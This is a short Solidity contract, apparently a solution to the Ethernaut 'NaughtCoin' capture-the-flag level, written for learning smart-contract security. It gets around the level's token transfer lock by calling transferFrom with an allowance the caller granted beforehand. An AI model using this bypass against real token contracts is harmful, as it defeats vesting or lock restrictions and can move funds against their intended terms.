// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "../levels/NaughtCoin.sol";

contract NaughtCoinAttack {
    function attack(address naughtCoinAddress) public returns (bool) {
	NaughtCoin instance = NaughtCoin(payable(naughtCoinAddress));
	uint256 amount = instance.allowance(msg.sender, address(this));
	return instance.transferFrom(msg.sender, address(this), amount);
    }
}
